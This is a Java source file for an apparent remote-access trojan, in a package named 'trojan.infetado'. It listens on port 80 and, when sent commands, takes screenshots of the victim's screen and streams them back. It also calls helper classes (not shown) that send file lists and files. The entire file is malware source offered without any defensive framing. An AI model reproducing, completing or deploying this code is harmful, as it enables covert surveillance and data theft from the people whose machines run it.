package trojan.infetado;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import javax.imageio.ImageIO;
import network.*;

public class Main {
    
    PrintWriter outt;
    BufferedReader inn;
    InputStream in = null;
    OutputStream out = null;
    Socket socket = null;
    

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";
    
        DataInputStream din;
        String com;

        ServerSocket servsock = new ServerSocket(80);
            Socket sock = servsock.accept();

           din = new DataInputStream(sock.getInputStream());
           
        String msg = "on";
        do {
            
            msg = din.readUTF();
            
            if (msg.equals(pic)) {
                Robot rob = new Robot();
                BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(image, "jpg", new File("screenshot.jpg"));
                FileInputStream fis = new FileInputStream("screenshot.jpg");
                DataOutputStream os = new DataOutputStream(sock.getOutputStream());
                int i = 0;
                while ((i = fis.read()) > -1) {
                    os.write(i);
                }
                fis.close();
                os.close();
            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                RecieveNum rn = new RecieveNum();
                SendNome sn = new SendNome();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));
        

    }

}
